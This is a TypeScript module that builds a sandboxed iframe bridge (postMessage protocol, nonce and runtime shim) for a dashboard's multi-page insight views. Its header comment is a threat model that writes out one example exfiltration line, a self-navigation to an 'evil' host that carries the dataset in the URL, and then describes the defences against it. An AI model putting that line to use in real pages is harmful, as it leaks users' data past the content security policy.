import { buildSandboxSrcdoc } from '../../lib/sandboxHtml';
import { LAB_HTML_KIT_CSS } from './labHtmlKit';
import type { AppPage, AppShell, Dataset } from './appModel';

/**
 * The `app/v1` host<->iframe bridge — protocol, the injected runtime shim,
 * and the srcdoc builder for a multi-page insight body.
 *
 * DELEGATION, NOT REIMPLEMENTATION (owner directive): `buildAppSrcdoc` calls
 * the SAME `buildSandboxSrcdoc` the Lab's html/v1 card and Chat's dream-html
 * block already use (`dashboard/src/lib/sandboxHtml.ts` — UNOWNED here,
 * shared with Chat, never edited by this module). `SANDBOX_CSP`/
 * `SANDBOX_GRANT` reach the app path completely untouched; that pair of
 * constants is the entire security argument and this file adds nothing to
 * it. The runtime shim rides in through `bodyScript`, the same extension
 * point Chat's `HEIGHT_BRIDGE` already uses.
 *
 * SELF-NAVIGATION (the capability this file adds over html/v1, and the risk
 * that comes with it): `default-src 'none'` stops every subresource load
 * (fetch/XHR/beacon/image) but NOTHING stops a sandboxed frame from
 * navigating ITSELF — no sandbox token gates it, and CSP fetch directives
 * don't govern a document replacing itself. Once an app body can ask the
 * host for data over `lab.data()` (host-served, never fetched — but real
 * numbers the html never embedded), a body that navigates itself to
 * `location.href = 'https://evil/?d=' + JSON.stringify(await lab.data())`
 * is a real outbound request the CSP does not stop. Two mechanisms close
 * this, both implemented in `LabAppFrame.tsx` (this module only supplies
 * the primitives they need):
 *
 *   M1 — load-count teardown (PRIMARY). The host counts `load` events on
 *   the iframe element. Load #1 is the srcdoc. A mounted `LabAppFrame`
 *   instance is contractually pinned to ONE page for its lifetime (callers
 *   MUST key by slug+pageId so a page change remounts rather than mutating
 *   `srcDoc` in place — see LabAppFrame's own docs) — so ANY second load on
 *   that instance can only mean the document inside navigated itself. On
 *   it: stop posting, stop accepting, force-remount to `about:blank`.
 *
 *   M2 — per-instance nonce (covers the race between navigation and the
 *   `load` event that reveals it). `mintAppNonce()` mints one nonce per
 *   srcdoc build; every inbound message must carry it exactly or is
 *   dropped, every outbound message carries it. A navigated-away document
 *   never learned the nonce — it can't newly request anything in the
 *   window before M1 notices. It CANNOT stop a hostile document from
 *   passively receiving a push already in flight, which is why M1 (stop
 *   posting at all) is primary and this is the belt to its braces.
 *
 * The honest bound on both: `lab.data()` only ever serves THIS insight's
 * own `cache.datasets` — never another insight's cache, never credentials,
 * never the manifest's `source` block. The script author and the html
 * author are the same person (both live in `lab/scripts/<slug>.mjs`,
 * already trusted at repo level — see `custom-script.ts`), so the bridge
 * moves data the author already owns across an already-crossable line; it
 * does not widen the trust boundary. See the `sandboxed-app-bridge-pattern`
 * knowledge pattern for the named revisit condition (a marketplace of
 * shared, independently-authored bodies) under which that stops being true.
 *
 * GATE ORDER on every inbound message (host receiving from iframe, and the
 * shim receiving from host): `event.source === contentWindow` FIRST — never
 * `event.origin`, which reads as the string `"null"` for an opaque-origin
 * sandboxed frame and would either reject our own frame or accept every
 * other sandboxed frame on the page (the Chat surface's own documented
 * lesson, `HtmlView.tsx`) — then the `__dreamLabApp` marker, then the nonce.
 */

export const LAB_APP_PROTOCOL = 1;

/** Namespaced so an unrelated `postMessage` (a dev tool, a browser
 *  extension) can never be misread as one of ours. */
export const LAB_APP_MESSAGE_MARKER = '__dreamLabApp';

// ─── Protocol ─────────────────────────────────────────────────────────────

/** iframe → host. */
export type LabAppOutbound =
  | { type: 'ready'; page: string | null }
  | { type: 'height'; px: number }
  | { type: 'navigate'; page: string; params: Record<string, string> }
  | { type: 'data'; requestId: string; dataset: string | null };

/** host → iframe. */
export type LabAppInbound =
  | { type: 'route'; page: string; params: Record<string, string> }
  | { type: 'dataResult'; requestId: string; ok: true; dataset: Dataset }
  | { type: 'dataResult'; requestId: string; ok: false; error: string }
  | { type: 'theme'; scheme: 'light' | 'dark'; tokens: Record<string, string> };

/** The envelope every message (either direction) is wrapped in on the wire. */
export type LabAppEnvelope<T> = T & {
  __dreamLabApp: 1;
  v: number;
  nonce: string;
};

/** Shape-check BEFORE the nonce comparison runs — a message that isn't even
 *  one of ours is rejected without touching `nonce` at all. */
export function isLabAppEnvelope(data: unknown): data is LabAppEnvelope<{ type: string }> {
  if (typeof data !== 'object' || data === null) return false;
  const r = data as Record<string, unknown>;
  return r[LAB_APP_MESSAGE_MARKER] === 1 && typeof r.type === 'string' && typeof r.nonce === 'string';
}

/** One nonce per mounted iframe instance (M2). `crypto.randomUUID()` is
 *  available in every context this dashboard serves from (localhost is a
 *  potentially-trustworthy origin); the fallback exists only for an
 *  environment stranger than that. This is a handshake token, not a secret
 *  — its job is to stop a navigated-away document from RE-ASKING the host
 *  for anything, not to resist cryptanalysis. */
export function mintAppNonce(): string {
  if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
    return crypto.randomUUID();
  }
  return Math.random().toString(36).slice(2);
}

// ─── The runtime shim ───────────────────────────────────────────────────────

/**
 * The shim, embedded as a JS string so it survives every toolchain (vitest
 * stubs raw file imports — the `lab-html-kit.css` lesson). `lab-app-runtime.js`
 * next to this file is the SAME text — the reference copy a script author
 * reads — pinned byte-identical by `tests/unit/lab-app-body.test.ts`.
 *
 * To edit: change the .js file, then copy its exact text here — never
 * hand-edit both independently.
 */
export const LAB_APP_RUNTIME_JS = `/**
 * lab-app-runtime.js — the shim injected into every \`app/v1\` page's sandboxed
 * srcdoc (host<->iframe postMessage bridge). This is the REFERENCE COPY a
 * script author reads; the shipped shim is \`LAB_APP_RUNTIME_JS\` in
 * labAppRuntime.ts (SAME text — vitest stubs raw file imports, the
 * lab-html-kit.css lesson, so the runtime cannot live behind an import
 * either). tests/unit/lab-app-body.test.ts pins the two byte-identical.
 *
 * Per-instance config (nonce, current page id, params, the declared page
 * list) is NOT baked into this file — it is set by a small JSON assignment
 * the host injects immediately before this script (\`window.__LAB_APP__\`),
 * so this shim's own text never changes between insights or reloads.
 *
 * Every message this shim sends or accepts carries three envelope fields:
 * \`__dreamLabApp: 1\` (namespaced so an unrelated postMessage can never be
 * misread as one of ours), \`v: 1\` (protocol version), and \`nonce\` (minted
 * fresh by the host per mounted iframe instance — a document that navigated
 * itself away from this srcdoc never learned it, so it cannot keep talking
 * to the host even in the window before the host's own load-count teardown
 * notices the navigation and stops posting).
 *
 * window.lab is the author-facing API: \`lab.page\`, \`lab.params\`,
 * \`lab.navigate(pageId, params?)\`, \`lab.data(key?)\` (a Promise resolving to
 * the host-served Dataset — the numbers were embedded at sync time, never
 * fetched), \`lab.onRoute(callback)\`.
 */
(function () {
  'use strict';
  var CFG = window.__LAB_APP__ || {};
  var NONCE = CFG.nonce || '';
  var PROTOCOL = 1;
  var pending = {};
  var reqSeq = 0;
  var routeHandlers = [];

  function post(type, extra) {
    var msg = { __dreamLabApp: 1, v: PROTOCOL, nonce: NONCE, type: type };
    for (var key in extra) {
      if (Object.prototype.hasOwnProperty.call(extra, key)) msg[key] = extra[key];
    }
    parent.postMessage(msg, '*');
  }

  function onMessage(event) {
    var data = event.data;
    if (!data || typeof data !== 'object') return;
    if (data.__dreamLabApp !== 1) return;
    if (data.nonce !== NONCE) return;
    if (data.type === 'route') {
      window.lab.page = data.page || null;
      window.lab.params = data.params || {};
      for (var i = 0; i < routeHandlers.length; i++) routeHandlers[i](window.lab.page, window.lab.params);
      return;
    }
    if (data.type === 'dataResult') {
      var cb = pending[data.requestId];
      if (!cb) return;
      delete pending[data.requestId];
      if (data.ok) cb.resolve(data.dataset);
      else cb.reject(new Error(data.error || 'lab.data failed'));
      return;
    }
    if (data.type === 'theme') {
      var root = document.documentElement;
      if (data.scheme) root.style.colorScheme = data.scheme;
      if (data.tokens) {
        for (var tokenKey in data.tokens) {
          if (Object.prototype.hasOwnProperty.call(data.tokens, tokenKey)) {
            root.style.setProperty(tokenKey, data.tokens[tokenKey]);
          }
        }
      }
      return;
    }
  }
  window.addEventListener('message', onMessage);

  window.lab = {
    page: CFG.page || null,
    params: CFG.params || {},
    navigate: function (pageId, params) {
      post('navigate', { page: pageId, params: params || {} });
    },
    data: function (key) {
      var requestId = 'r' + (++reqSeq);
      return new Promise(function (resolve, reject) {
        pending[requestId] = { resolve: resolve, reject: reject };
        post('data', { requestId: requestId, dataset: key || null });
      });
    },
    onRoute: function (callback) {
      routeHandlers.push(callback);
    },
  };

  // ── height bridge — mirrors the Chat surface's HEIGHT_BRIDGE (chatHtmlKit.ts) ──
  var lastHeight = -1;
  function reportHeight() {
    var h = Math.ceil(document.body.getBoundingClientRect().height);
    if (h === lastHeight) return;
    lastHeight = h;
    post('height', { px: h });
  }
  if (window.ResizeObserver) new ResizeObserver(reportHeight).observe(document.body);
  // A late web font or an image finishing decode changes the height after the
  // observer's first callback, so the load event is a second chance, not a duplicate.
  window.addEventListener('load', reportHeight);
  document.addEventListener('click', function () { setTimeout(reportHeight, 0); }, true);

  post('ready', { page: window.lab.page });
  reportHeight();
})();
`;

/** Escape `<` so a page/param string containing a literal `</script>` (or
 *  `<!--`) can never terminate the config script tag early — the config is
 *  author-adjacent data (page ids from the manifest, params from a URL),
 *  not something to trust blindly even at this trust level. Exported for
 *  direct unit coverage and so a test can reconstruct `buildAppSrcdoc`'s
 *  expected output without duplicating its escaping logic. */
export function escapeForInlineScript(json: string): string {
  return json.replace(/</g, '\\u003C');
}

export interface BuildAppSrcdocInput {
  /** The page THIS srcdoc renders — one document per page (T4 owns the
   *  frame; page-to-page navigation is a host-driven remount, never an
   *  in-place `srcDoc` mutation on the same iframe element). */
  page: AppPage;
  shell?: AppShell;
  /** Every declared page's id+title — handed to the shim for its own
   *  bookkeeping only; the host, not the shim, is what validates a
   *  `navigate` request against this list. */
  pages: { id: string; title: string }[];
  tokens: Record<string, string>;
  scheme: 'light' | 'dark';
  params: Record<string, string>;
  /** Minted by the caller via {@link mintAppNonce} — once per mounted
   *  frame instance, not once per srcdoc build call. */
  nonce: string;
}

/**
 * The complete srcdoc for one `app/v1` page. Delegates to
 * `buildSandboxSrcdoc` for the CSP-first/tokens/kit/override/body ordering
 * — this function only decides WHAT goes in `html`/`css`, never how they
 * are assembled.
 *
 * ORDERING IS LOAD-BEARING, and this bridge's requirement is stricter than
 * the surface-script slot's: the author's page calls `window.lab.data()`/
 * `lab.navigate()` SYNCHRONOUSLY, as the first thing its own inline
 * `<script>` does. So the config assignment, the runtime shim, and any
 * `shell.script` are prepended INTO `html`, immediately ahead of
 * `page.html`, where they are one contiguous unit with the page they serve
 * — `window.lab` must exist before the page's own script tag is even
 * parsed, or every statement after its first `lab.*` call never runs (a bug
 * this exact shape produced once: the page's click handlers live in the
 * SAME script block as its `lab.data()` call, so `window.lab` arriving late
 * silently killed navigation too, not just the data call).
 */
export function buildAppSrcdoc(input: BuildAppSrcdocInput): string {
  const { page, shell, pages, tokens, scheme, params, nonce } = input;
  const config = { nonce, page: page.id, params, pages, protocol: LAB_APP_PROTOCOL };
  const configScript = `window.__LAB_APP__ = ${escapeForInlineScript(JSON.stringify(config))};`;
  const preScript = [configScript, LAB_APP_RUNTIME_JS, shell?.script]
    .filter((part): part is string => !!part && part.length > 0)
    .join('\n');
  return buildSandboxSrcdoc({
    html: `<script>${preScript}</script>${page.html}`,
    css: LAB_HTML_KIT_CSS,
    tokens,
    scheme,
    overrideCss: shell?.style,
  });
}
